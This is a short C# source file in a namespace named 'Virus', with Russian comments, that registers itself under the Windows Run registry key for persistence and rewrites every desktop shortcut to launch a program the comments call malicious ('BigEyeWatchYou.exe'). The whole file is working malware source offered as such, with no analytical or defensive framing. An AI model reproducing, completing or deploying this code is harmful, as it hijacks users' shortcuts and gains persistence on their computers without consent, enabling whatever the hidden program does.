using System;
using System.IO;
using Microsoft.Win32;
using LnkChanger;

namespace Virus
{
    class Program
    {

        [STAThread]
        static void Main(string[] args)
        {
            SetStartup();

            // Получение пути к рабочему столу
            var desktopFolder = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);

            // Получение файлов ярлыков
            var files = LnkHelper.GetAllShortcutsFiles(desktopFolder);

            // Получение абсолютного пути к вредоносной программе
            var targetPath = Path.GetFullPath("BigEyeWatchYou.exe");

            foreach (var file in files)
            {

                // Получем путь, который щас указан в ярлык
                // Если он не содержит путь к нашей вредоносной программе, то меняем
                var path = LnkHelper.GetShellLinkPath(file.FullName);
                if (!path.Contains("BigEyeWatchYou.exe"))
                {
                    LnkHelper.ChangeShortcut(file.FullName, targetPath,
                        QuotedMarked(Path.GetFileNameWithoutExtension(file.Name)));
                }
            }
        }

        /// <summary>
        /// Оборачивает строку в двойные кавычки
        /// </summary>
        /// <param name="value"></param>
        /// <returns></returns>
        private static string QuotedMarked(string value)
        {
            return $"\"{value}\"";
        }

        /// <summary>
        /// Добавляет приложение в автозагрузку, если его там нет
        /// </summary>
        private static void SetStartup()
        {
            RegistryKey rk = Registry.CurrentUser.OpenSubKey
                ("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);

            string appFullPath = System.Reflection.Assembly.GetExecutingAssembly().Location;
            string appName = Path.GetFileNameWithoutExtension(appFullPath);

            if (rk.GetValue(appName) == null)
            {
                rk.SetValue(appName, appFullPath);
            }
        }
    }
}
